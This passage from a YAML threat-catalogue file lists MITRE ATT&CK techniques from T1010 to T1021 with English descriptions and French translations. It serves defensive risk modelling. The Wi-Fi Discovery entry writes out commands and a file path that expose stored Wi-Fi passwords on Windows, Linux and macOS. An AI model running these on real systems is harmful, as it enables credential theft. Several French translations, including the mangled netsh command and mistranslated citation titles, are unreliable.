          \ un commandement et un contr\xF4le fiables et d\u2019\xE9viter les seuils\
          \ de transfert de donn\xE9es.\nhttps://attack.mitre.org/techniques/T1008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1010
    ref_id: T1010
    name: Application Window Discovery
    description: 'Adversaries may attempt to get a listing of open application windows.
      Window listings could convey information about how the system is used.(Citation:
      Prevailion DarkWatchman 2021) For example, information about application windows
      could be used identify potential data to collect as well as identifying security
      tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001))
      to evade.(Citation: ESET Grandoreiro April 2020)


      Adversaries typically abuse system features for this type of enumeration. For
      example, they may gather information through native system features such as
      [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
      commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.

      https://attack.mitre.org/techniques/T1010'
    translations:
      fr:
        name: "D\xE9couverte de fen\xEAtres d\u2019application"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ fen\xEAtres d\u2019application ouvertes. Les listes de fen\xEAtres pourraient\
          \ fournir des informations sur l\u2019utilisation du syst\xE8me. (Citation\
          \ : Prevailion DarkWatchman 2021) Par exemple, des informations sur les\
          \ fen\xEAtres d\u2019application peuvent \xEAtre utilis\xE9es pour identifier\
          \ des donn\xE9es potentielles \xE0 collecter ainsi que pour identifier les\
          \ outils de s\xE9curit\xE9 ([D\xE9couverte de logiciels de s\xE9curit\xE9\
          ](https://attack.mitre.org/techniques/T1518/001)) \xE0 contourner. (Citation\
          \ : ESET Grandoreiro, avril 2020)\n\nLes adversaires abusent g\xE9n\xE9\
          ralement des fonctionnalit\xE9s du syst\xE8me pour ce type d\u2019\xE9num\xE9\
          ration. Par exemple, ils peuvent recueillir des informations via des fonctionnalit\xE9\
          s syst\xE8me natives telles que les commandes [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
          \ et les fonctions [Native API](https://attack.mitre.org/techniques/T1106).\n\
          https://attack.mitre.org/techniques/T1010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1011
    ref_id: T1011
    name: Exfiltration Over Other Network Medium
    description: 'Adversaries may attempt to exfiltrate data over a different network
      medium than the command and control channel. If the command and control network
      is a wired Internet connection, the exfiltration may occur, for example, over
      a WiFi connection, modem, cellular data connection, Bluetooth, or another radio
      frequency (RF) channel.


      Adversaries may choose to do this if they have sufficient access or proximity,
      and the connection might not be secured or defended as well as the primary Internet-connected
      channel because it is not routed through the same enterprise network.

      https://attack.mitre.org/techniques/T1011'
    translations:
      fr:
        name: "Exfiltration sur un autre support r\xE9seau"
        description: "Les adversaires peuvent tenter d\u2019exfiltrer des donn\xE9\
          es via un support r\xE9seau diff\xE9rent du canal de commandement et de\
          \ contr\xF4le. Si le r\xE9seau de commande et de contr\xF4le est une connexion\
          \ Internet filaire, l\u2019exfiltration peut se produire, par exemple, via\
          \ une connexion WiFi, un modem, une connexion de donn\xE9es cellulaires,\
          \ Bluetooth ou un autre canal radiofr\xE9quence (RF).\n\nLes adversaires\
          \ peuvent choisir de le faire s\u2019ils ont un acc\xE8s suffisant ou une\
          \ proximit\xE9 suffisante, et la connexion peut ne pas \xEAtre s\xE9curis\xE9\
          e ou d\xE9fendue aussi bien que le canal principal connect\xE9 \xE0 Internet\
          \ car elle n\u2019est pas achemin\xE9e via le m\xEAme r\xE9seau d\u2019\
          entreprise.\nhttps://attack.mitre.org/techniques/T1011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1011.001
    ref_id: T1011.001
    name: Exfiltration Over Bluetooth
    description: 'Adversaries may attempt to exfiltrate data over Bluetooth rather
      than the command and control channel. If the command and control network is
      a wired Internet connection, an adversary may opt to exfiltrate data using a
      Bluetooth communication channel.


      Adversaries may choose to do this if they have sufficient access and proximity.
      Bluetooth connections might not be secured or defended as well as the primary
      Internet-connected channel because it is not routed through the same enterprise
      network.

      https://attack.mitre.org/techniques/T1011/001'
    translations:
      fr:
        name: Exfiltration via Bluetooth
        description: "Les adversaires peuvent tenter d\u2019exfiltrer des donn\xE9\
          es via Bluetooth plut\xF4t que via le canal de commandement et de contr\xF4\
          le. Si le r\xE9seau de commandement et de contr\xF4le est une connexion\
          \ Internet filaire, un adversaire peut choisir d\u2019exfiltrer les donn\xE9\
          es via un canal de communication Bluetooth.\n\nLes adversaires peuvent choisir\
          \ de le faire s\u2019ils ont un acc\xE8s et une proximit\xE9 suffisants.\
          \ Les connexions Bluetooth peuvent ne pas \xEAtre aussi s\xE9curis\xE9es\
          \ ou prot\xE9g\xE9es que le canal principal connect\xE9 \xE0 Internet, car\
          \ elles ne sont pas achemin\xE9es via le m\xEAme r\xE9seau d\u2019entreprise.\n\
          https://attack.mitre.org/techniques/T1011/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1012
    ref_id: T1012
    name: Query Registry
    description: 'Adversaries may interact with the Windows Registry to gather information
      about the system, configuration, and installed software.


      The Registry contains a significant amount of information about the operating
      system, configuration, software, and security.(Citation: Wikipedia Windows Registry)
      Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075)
      utility, though other means to access the Registry exist. Some of the information
      may help adversaries to further their operation within a network. Adversaries
      may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.'
    translations:
      fr:
        name: "Registre de requ\xEAtes"
        description: "Les adversaires peuvent interagir avec le Registre Windows pour\
          \ recueillir des informations sur le syst\xE8me, la configuration et le\
          \ logiciel install\xE9.\n\nLe Registre contient une quantit\xE9 importante\
          \ d\u2019informations sur le syst\xE8me d\u2019exploitation, la configuration,\
          \ les logiciels et la s\xE9curit\xE9. (Citation : Wikip\xE9dia Windows Registry)\
          \ Les informations peuvent facilement \xEAtre interrog\xE9es via l\u2019\
          utilitaire [Reg](https://attack.mitre.org/software/S0075), bien que d\u2019\
          autres moyens d\u2019acc\xE9der au Registre existent. Certaines informations\
          \ peuvent aider les adversaires \xE0 faire avancer leur op\xE9ration au\
          \ sein d\u2019un r\xE9seau. Les adversaires peuvent utiliser les informations\
          \ du [Registre de requ\xEAtes](https://attack.mitre.org/techniques/T1012)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1014
    ref_id: T1014
    name: Rootkit
    description: "Adversaries may use rootkits to hide the presence of programs, files,\
      \ network connections, services, drivers, and other system components. Rootkits\
      \ are programs that hide the existence of malware by intercepting/hooking and\
      \ modifying operating system API calls that supply system information. (Citation:\
      \ Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality\
      \ may reside at the user or kernel level in the operating system or lower, to\
      \ include a hypervisor or [System Firmware](https://attack.mitre.org/techniques/T1542/001).\
      \ (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux,\
      \ and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat\
      \ Mac OSX Rootkit)\n\nRootkits that reside or modify boot sectors are known\
      \ as [Bootkit](https://attack.mitre.org/techniques/T1542/003)s and specifically\
      \ target the boot process of the operating system.\nhttps://attack.mitre.org/techniques/T1014"
    translations:
      fr:
        name: Rootkit
        description: "Les adversaires peuvent utiliser des rootkits pour dissimuler\
          \ la pr\xE9sence de programmes, fichiers, connexions r\xE9seau, services,\
          \ pilotes et autres composants syst\xE8me. Les rootkits sont des programmes\
          \ qui masquent l\u2019existence de malwares en interceptant/accrochent et\
          \ modifiant les appels API du syst\xE8me d\u2019exploitation qui fournissent\
          \ des informations syst\xE8me. (Citation : Symantec Windows Rootkits) \n\
          \nLes rootkits ou fonctionnalit\xE9s activant rootkits peuvent r\xE9sider\
          \ au niveau de l\u2019utilisateur ou du noyau dans le syst\xE8me d\u2019\
          exploitation ou dans une version inf\xE9rieure, y compris un hyperviseur\
          \ ou un [firmware syst\xE8me](https://attack.mitre.org/techniques/T1542/001).\
          \ (Citation : Wikip\xE9dia Rootkit) Des rootkits ont \xE9t\xE9 vus pour\
          \ Windows, Linux et Mac OS X. (Citation : Rootkit Linux CrowdStrike) (Citation\
          \ : BlackHat Mac OSX Rootkit)\n\nLes rootkits qui r\xE9sident ou modifient\
          \ les secteurs de d\xE9marrage sont appel\xE9s [Bootkit](https://attack.mitre.org/techniques/T1542/003)\
          \ et ciblent sp\xE9cifiquement le processus de d\xE9marrage du syst\xE8\
          me d\u2019exploitation.\nhttps://attack.mitre.org/techniques/T1014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016
    ref_id: T1016
    name: System Network Configuration Discovery
    description: 'Adversaries may look for details about the network configuration
      and settings, such as IP and/or MAC addresses, of systems they access or through
      information discovery of remote systems. Several operating system administration
      utilities exist that can be used to gather this information. Examples include
      [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101),
      [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).


      Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to gather information about configurations and settings,
      such as IP addresses of configured interfaces and static/dynamic routes (e.g.
      <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation:
      Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to
      gather network configuration information. For example, the command `esxcli network
      nic list` will retrieve the MAC address, while `esxcli network ip interface
      ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse
      2024)


      Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)
      during automated discovery to shape follow-on behaviors, including determining
      certain access within the target network and what actions to do next.'
    translations:
      fr:
        name: "D\xE9couverte de la configuration du r\xE9seau syst\xE8me"
        description: "Les adversaires peuvent rechercher des d\xE9tails sur la configuration\
          \ et les param\xE8tres r\xE9seau, tels que les adresses IP et/ou MAC, des\
          \ syst\xE8mes auxquels ils acc\xE8dent, ou par la d\xE9couverte d\u2019\
          informations de syst\xE8mes distants. Plusieurs utilitaires d\u2019administration\
          \ du syst\xE8me d\u2019exploitation existent pour recueillir ces informations.\
          \ Parmi les exemples figurent [Arp](https://attack.mitre.org/software/S0099),\
          \ [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101),\
          \ [nbtstat](https://attack.mitre.org/software/S0102) et [route](https://attack.mitre.org/software/S0103).\n\
          \nLes adversaires peuvent \xE9galement utiliser une [CLI de dispositif r\xE9\
          seau](https://attack.mitre.org/techniques/T1059/008) sur les appareils r\xE9\
          seau pour recueillir des informations sur les configurations et r\xE9glages,\
          \ tels que les adresses IP des interfaces configur\xE9es et les routes statiques/dynamiques\
          \ (par exemple, <code>afficher la route IP</code>, <code>afficher l\u2019\
          interface IP</code>). (Citation : US-CERT-TA18-106A)(Citation : Mandiant\
          \ APT41 Intrusion globale) Sur ESXi, les adversaires peuvent utiliser esxcli\
          \ pour recueillir des informations de configuration r\xE9seau. Par exemple,\
          \ la commande 'esxcli network nic list' r\xE9cup\xE9rera l\u2019adresse\
          \ MAC, tandis que 'esxcli network ip interface ipv4 get' r\xE9cup\xE9rera\
          \ l\u2019adresse IPv4 locale. (Citation : Trellix Rnasomhouse 2024)\n\n\
          Les adversaires peuvent utiliser les informations issues de la [D\xE9couverte\
          \ de configuration du r\xE9seau syst\xE8me](https://attack.mitre.org/techniques/T1016)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris d\xE9terminer certains acc\xE8s au sein du r\xE9seau\
          \ cible et les actions \xE0 effectuer ensuite."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016.001
    ref_id: T1016.001
    name: Internet Connection Discovery
    description: 'Adversaries may check for Internet connectivity on compromised systems.
      This may be performed during automated discovery and can be accomplished in
      numerous ways such as using [Ping](https://attack.mitre.org/software/S0097),
      <code>tracert</code>, and GET requests to websites, or performing initial speed
      testing to confirm bandwidth.


      Adversaries may use the results and responses from these requests to determine
      if the system is capable of communicating with their C2 servers before attempting
      to connect to them. The results may also be used to identify routes, redirectors,
      and proxy servers.

      https://attack.mitre.org/techniques/T1016/001'
    translations:
      fr:
        name: "D\xE9couverte de la connexion Internet"
        description: "Les adversaires peuvent v\xE9rifier la connectivit\xE9 Internet\
          \ sur des syst\xE8mes compromis. Cela peut \xEAtre effectu\xE9 lors de la\
          \ d\xE9couverte automatis\xE9e et peut \xEAtre r\xE9alis\xE9 de nombreuses\
          \ mani\xE8res, comme l\u2019utilisation de requ\xEAtes [Ping](https://attack.mitre.org/software/S0097),\
          \ <code>tracert</code> et GET sur des sites web, ou la r\xE9alisation de\
          \ tests de vitesse initiaux pour confirmer la bande passante.\n\nLes adversaires\
          \ peuvent utiliser les r\xE9sultats et r\xE9ponses de ces requ\xEAtes pour\
          \ d\xE9terminer si le syst\xE8me est capable de communiquer avec leurs serveurs\
          \ C2 avant de tenter de s\u2019y connecter. Les r\xE9sultats peuvent \xE9\
          galement \xEAtre utilis\xE9s pour identifier des routes, des redirecteurs\
          \ et des serveurs proxy.\nhttps://attack.mitre.org/techniques/T1016/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016.002
    ref_id: T1016.002
    name: Wi-Fi Discovery
    description: "Adversaries may search for information about Wi-Fi networks, such\
      \ as network names and passwords, on compromised systems. Adversaries may use\
      \ Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087),\
      \ [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and\
      \ other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006)\
      \ activity to support both ongoing and future campaigns.\n\nAdversaries may\
      \ collect various types of information about Wi-Fi networks from hosts. For\
      \ example, on Windows names and passwords of all Wi-Fi networks a device has\
      \ previously connected to may be available through `netsh wlan show profiles`\
      \ to enumerate Wi-Fi names and then `netsh wlan show profile \u201CWi-Fi name\u201D\
      \ key=clear` to show a Wi-Fi network\u2019s corresponding password.(Citation:\
      \ BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes\
      \ New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35\
      \ CharmPower January 2022) Additionally, names and other details of locally\
      \ reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native\
      \ API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary\
      \ Defense Emotes Wi-Fi Spreader)\n\nOn Linux, names and passwords of all Wi-Fi-networks\
      \ a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation:\
      \ Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password\
      \ of a known Wi-Fi may be identified with ` security find-generic-password -wa\
      \ wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password\
      \ on Mac)\nhttps://attack.mitre.org/techniques/T1016/002"
    translations:
      fr:
        name: "D\xE9couverte Wi-Fi"
        description: "Les adversaires peuvent rechercher des informations sur les\
          \ r\xE9seaux Wi-Fi, tels que les noms et mots de passe des r\xE9seaux, sur\
          \ des syst\xE8mes compromis. Les adversaires peuvent utiliser les informations\
          \ Wi-Fi dans le cadre de [D\xE9couverte de compte](https://attack.mitre.org/techniques/T1087),\
          \ [D\xE9couverte \xE0 distance du syst\xE8me](https://attack.mitre.org/techniques/T1018),\
          \ et d\u2019autres activit\xE9s de d\xE9couverte ou d'[Acc\xE8s aux Cr\xE9\
          dentiels](https://attack.mitre.org/tactics/TA0006) pour soutenir \xE0 la\
          \ fois des campagnes en cours et futures.\n\nLes adversaires peuvent collecter\
          \ divers types d\u2019informations sur les r\xE9seaux Wi-Fi aupr\xE8s des\
          \ h\xF4tes. Par exemple, sur Windows, les noms et mots de passe de tous\
          \ les r\xE9seaux Wi-Fi auxquels un appareil s\u2019est d\xE9j\xE0 connect\xE9\
          \ peuvent \xEAtre disponibles via \xAB netsh wlan show profiles \xBB pour\
          \ \xE9num\xE9rer les noms Wi-Fi, puis \xAB netsh wlan show profile \xBB\
          \ cl\xE9 \xAB\_Wi-Fi name\_\xBB = clear\_\xBB \xBB pour afficher le mot\
          \ de passe correspondant d\u2019un r\xE9seau Wi-Fi. (Citation : Agent informatique\
          \ bip Tesla vole les mots de passe wifi)(Citation : MalwareBytes : Nouvelle\
          \ variante AgentTesla vole les identifiants WiFi)(Citation : Check Point\
          \ APT35 CharmPower janvier 2022) De plus, les noms et autres d\xE9tails\
          \ des r\xE9seaux Wi-Fi localement accessibles peuvent \xEAtre d\xE9couverts\
          \ en appelant les fonctions \xAB wlanAPI.dll \xBB [API native](https://attack.mitre.org/techniques/T1106).\
          \ (Citation : \xC9mote Wi-Fi de d\xE9fense binaire)\n\nSous Linux, les noms\
          \ et mots de passe de tous les r\xE9seaux Wi-Fi auxquels un appareil s\u2019\
          est d\xE9j\xE0 connect\xE9 peuvent \xEAtre disponibles dans les fichiers\
          \ sous ' /etc/NetworkManager/system-connections/'. (Citation : Mot de passe\
          \ Wi-Fi de tous les r\xE9seaux connect\xE9s sous Windows/Linux) Sur macOS,\
          \ le mot de passe d\u2019un Wi-Fi connu peut \xEAtre identifi\xE9 par \xAB\
          \ security find-generic-password -wa wifiname \xBB (n\xE9cessite un nom\
          \ d\u2019utilisateur/mot de passe administrateur). (Citation : Trouver le\
          \ mot de passe Wi-Fi sur Mac)\nhttps://attack.mitre.org/techniques/T1016/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1018
    ref_id: T1018
    name: Remote System Discovery
    description: 'Adversaries may attempt to get a listing of other systems by IP
      address, hostname, or other logical identifier on a network that may be used
      for Lateral Movement from the current system. Functionality could exist within
      remote access tools to enable this, but utilities available on the operating
      system could also be used such as  [Ping](https://attack.mitre.org/software/S0097),
      <code>net view</code> using [Net](https://attack.mitre.org/software/S0039),
      or, on ESXi servers, `esxcli network diag ping`.


      Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code>
      or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099)
      cache entries) in order to discover the presence of remote systems in an environment.


      Adversaries may also target discovery of network infrastructure as well as leverage
      [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands
      on network devices to gather detailed information about systems within a network
      (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation:
      CISA AR21-126A FIVEHANDS May 2021)

      https://attack.mitre.org/techniques/T1018'
    translations:
      fr:
        name: "D\xE9couverte \xE0 distance du syst\xE8me"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste d\u2019\
          autres syst\xE8mes par adresse IP, nom d\u2019h\xF4te ou autre identifiant\
          \ logique sur un r\xE9seau qui peut \xEAtre utilis\xE9 pour le mouvement\
          \ lat\xE9ral depuis le syst\xE8me actuel. Des fonctionnalit\xE9s pouvaient\
          \ exister dans les outils d\u2019acc\xE8s \xE0 distance pour permettre cela,\
          \ mais des utilitaires disponibles sur le syst\xE8me d\u2019exploitation\
          \ pouvaient aussi \xEAtre utilis\xE9s comme [Ping](https://attack.mitre.org/software/S0097),\
          \ <code>la vue net</code> via [Net](https://attack.mitre.org/software/S0039),\
          \ ou, sur les serveurs ESXi, \xAB esxcli network diag ping \xBB.\n\nLes\
          \ adversaires peuvent \xE9galement analyser des donn\xE9es provenant de\
          \ fichiers h\xF4tes locaux (ex : <code>C\_:\\Windows\\System32\\Drivers\\\
          etc\\hosts</code> ou <code>/etc/hosts</code>) ou d\u2019autres moyens passifs\
          \ (comme les entr\xE9es de cache [Arp](https://attack.mitre.org/software/S0099)\
          \ locales) afin de d\xE9tecter la pr\xE9sence de syst\xE8mes distants dans\
          \ un environnement.\n\nLes adversaires peuvent \xE9galement cibler la d\xE9\
          couverte de l\u2019infrastructure r\xE9seau ainsi que l\u2019utilisation\
          \ des commandes [CLI de l\u2019appareil r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ sur les dispositifs r\xE9seau pour recueillir des informations d\xE9taill\xE9\
          es sur les syst\xE8mes au sein d\u2019un r\xE9seau (par exemple, <code>montrer\
          \ les voisins cdp</code>, <code>afficher arp</code>). (Citation : US-CERT-TA18-106A)(Citation\
          \ : CISA AR21-126A FIVEHANDS mai 2021)\nhttps://attack.mitre.org/techniques/T1018"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1020
    ref_id: T1020
    name: Automated Exfiltration
    description: "Adversaries may exfiltrate data, such as sensitive documents, through\
      \ the use of automated processing after being gathered during Collection.(Citation:\
      \ ESET Gamaredon June 2020) \n\nWhen automated exfiltration is used, other exfiltration\
      \ techniques likely apply as well to transfer the information out of the network,\
      \ such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041)\
      \ and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).\n\
      https://attack.mitre.org/techniques/T1020"
    translations:
      fr:
        name: "Exfiltration automatis\xE9e"
        description: "Les adversaires peuvent exfiltrer des donn\xE9es, telles que\
          \ des documents sensibles, par l\u2019utilisation d\u2019un traitement automatis\xE9\
          \ apr\xE8s leur collecte lors de la collecte. (Citation : ESET Gamaredon\
          \ juin 2020) \n\nLorsque l\u2019exfiltration automatis\xE9e est utilis\xE9\
          e, d\u2019autres techniques d\u2019exfiltration s\u2019appliquent probablement\
          \ aussi pour transf\xE9rer les informations hors du r\xE9seau, telles que\
          \ [Exfiltration sur canal C2](https://attack.mitre.org/techniques/T1041)\
          \ et [Exfiltration sur protocole alternatif](https://attack.mitre.org/techniques/T1048).\n\
          https://attack.mitre.org/techniques/T1020"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1020.001
    ref_id: T1020.001
    name: Traffic Duplication
    description: 'Adversaries may leverage traffic mirroring in order to automate
      data exfiltration over compromised infrastructure. Traffic mirroring is a native
      feature for some devices, often used for network analysis. For example, devices
      may be configured to forward network traffic to one or more destinations for
      analysis by a network analyzer or other monitoring device. (Citation: Cisco
      Traffic Mirroring)(Citation: Juniper Traffic Mirroring)


      Adversaries may abuse traffic mirroring to mirror or redirect network traffic
      through other infrastructure they control. Malicious modifications to network
      devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)
      or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation:
      US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)


      Many cloud-based environments also support traffic mirroring. For example, AWS
      Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define
      specified instances to collect traffic from and specified targets to send collected
      traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation:
      Azure Virtual Network TAP)


      Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040),
      [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      depending on the goals and objectives of the adversary.

      https://attack.mitre.org/techniques/T1020/001'
    translations:
      fr:
        name: Duplication du trafic
        description: "Les adversaires peuvent utiliser le miroir du trafic afin d\u2019\
          automatiser l\u2019exfiltration de donn\xE9es sur des infrastructures compromises.\
          \ Le miroirement du trafic est une fonctionnalit\xE9 native de certains\
          \ appareils, souvent utilis\xE9e pour l\u2019analyse r\xE9seau. Par exemple,\
          \ les appareils peuvent \xEAtre configur\xE9s pour transmettre le trafic\
          \ r\xE9seau vers une ou plusieurs destinations pour analyse par un analyseur\
          \ r\xE9seau ou un autre dispositif de surveillance. (Citation : Miroir de\
          \ circulation Cisco)(Citation : Miroir du trafic de gen\xE9vrier)\n\nLes\
          \ adversaires peuvent abuser du miroir du trafic pour miroiter ou rediriger\
          \ le trafic r\xE9seau via d\u2019autres infrastructures qu\u2019ils contr\xF4\
          lent. Des modifications malveillantes des dispositifs r\xE9seau pour permettre\
          \ la redirection du trafic peuvent \xEAtre possibles via [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)\
          \ ou [Patch System Image](https://attack.mitre.org/techniques/T1601/001).\
          \ (Citation : US-CERT-TA18-106A)(Citation : Attaques d\u2019appareils h\xE9\
          rit\xE9s du blog Cisco)\n\nDe nombreux environnements cloud prennent \xE9\
          galement en charge la miroirisation du trafic. Par exemple, AWS Traffic\
          \ Mirroring, GCP Packet Mirroring et Azure vTap permettent aux utilisateurs\
          \ de d\xE9finir des instances sp\xE9cifi\xE9es pour collecter le trafic\
          \ et des cibles pr\xE9cises vers lesquelles envoyer le trafic collect\xE9\
          . (Citation : Mirroring du trafic AWS)(Citation : Mise en miroir de paquets\
          \ GCP)(Citation : Azure Virtual Network TAP)\n\nLes adversaires peuvent\
          \ utiliser la duplication du trafic en conjonction avec [Network Sniffing](https://attack.mitre.org/techniques/T1040),\
          \ [Input Capture](https://attack.mitre.org/techniques/T1056) ou [Adversaire-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
          \ selon les buts et objectifs de l\u2019adversaire.\nhttps://attack.mitre.org/techniques/T1020/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021
    ref_id: T1021
    name: Remote Services
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into a service that accepts remote connections, such as telnet, SSH,\
      \ and VNC. The adversary may then perform actions as the logged-on user.\n\n\
      In an enterprise environment, servers and workstations can be organized into\
      \ domains. Domains provide centralized identity management, allowing users to\
      \ login using one set of credentials across the entire network. If an adversary\
      \ is able to obtain a set of valid domain credentials, they could login to many\
      \ different machines using remote access protocols such as secure shell (SSH)\
      \ or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet\
      \ Remote Desktop Services) They could also login to accessible SaaS or IaaS\
      \ services, such as those that federate their identities to the domain, or management\
      \ platforms for internal virtualization environments such as VMware vCenter.\
      \ \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072)\
      \ and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is\
      \ native software used for remote management. ARD leverages a blend of protocols,\
      \ including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the\
      \ screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004)\
      \ for secure file transfer.(Citation: Remote Management MDM macOS)(Citation:\
      \ Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin\
      \ Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code\
      \ execution and perform lateral movement. In versions of macOS prior to 10.14,\
      \ an adversary can escalate an SSH session to an ARD session which enables an\
      \ adversary to accept TCC (Transparency, Consent, and Control) prompts without\
      \ user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote\
      \ Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop\
      \ commands)"
    translations:
      fr:
        name: "Services \xE0 distance"
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour se connecter \xE0 un service acceptant des connexions distantes,\
          \ telles que telnet, SSH et VNC. L\u2019adversaire peut alors effectuer\
          \ des actions en tant qu\u2019utilisateur connect\xE9.\n\nDans un environnement\
          \ d\u2019entreprise, les serveurs et postes de travail peuvent \xEAtre organis\xE9\
          s en domaines. Les domaines offrent une gestion centralis\xE9e de l\u2019\
          identit\xE9, permettant aux utilisateurs de se connecter avec un seul ensemble\
          \ d\u2019identifiants sur l\u2019ensemble du r\xE9seau. Si un adversaire\
          \ parvient \xE0 obtenir un ensemble de r\xE9f\xE9rences de domaine valides,\
          \ il peut se connecter \xE0 de nombreuses machines diff\xE9rentes en utilisant\
          \ des protocoles d\u2019acc\xE8s \xE0 distance tels que le secure shell\
          \ (SSH) ou le remote desktop protocol (RDP). (Citation : Coque s\xE9curis\xE9\
          e SSH)(Citation : Services de bureau \xE0 distance TechNet) Ils pouvaient\
          \ \xE9galement se connecter \xE0 des services SaaS ou IaaS accessibles,\
          \ tels que ceux qui f\xE9d\xE9rent leur identit\xE9 au domaine, ou des plateformes\
          \ de gestion pour des environnements de virtualisation internes comme VMware\
          \ vCenter. \n\nLes applications l\xE9gitimes (telles que [Software Deployment\
          \ Tools](https://attack.mitre.org/techniques/T1072) et autres programmes\
          \ administratifs) peuvent utiliser [Remote Services](https://attack.mitre.org/techniques/T1021)\
          \ pour acc\xE9der aux h\xF4tes distants. Par exemple, Apple Remote Desktop\
          \ (ARD) sur macOS est un logiciel natif utilis\xE9 pour la gestion \xE0\
          \ distance. L\u2019ARD utilise un m\xE9lange de protocoles, dont [VNC](https://attack.mitre.org/techniques/T1021/005)\
          \ pour envoyer les tampons d\u2019\xE9cran et de contr\xF4le, et [SSH](https://attack.mitre.org/techniques/T1021/004)\
          \ pour le transfert s\xE9curis\xE9 de fichiers. (Citation : Gestion \xE0\
          \ distance MDM macOS)(Citation : Kickstart des commandes Apple Remote Desktop)(Citation\
          \ : Guide d\u2019administration Apple Remote Desktop 3.3) Les adversaires\
          \ peuvent abuser d\u2019applications telles que l\u2019ARD pour obtenir\
          \ une ex\xE9cution de code \xE0 distance et effectuer des d\xE9placements\
          \ lat\xE9raux. Dans les versions ant\xE9rieures \xE0 la 10.14, un adversaire\
          \ peut faire passer une session SSH \xE0 une session ARD, ce qui permet\
          \ \xE0 un adversaire d\u2019accepter les invites TCC (Transparence, Consentement\
          \ et Contr\xF4le) sans interaction utilisateur et d\u2019acc\xE9der aux\
          \ donn\xE9es. (Citation : FireEye 2019 Apple Remote Desktop)(Citation :\
          \ Lockboxx ARD 2019)(Citation : Kickstart des commandes Apple Remote Desktop)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.001
    ref_id: T1021.001
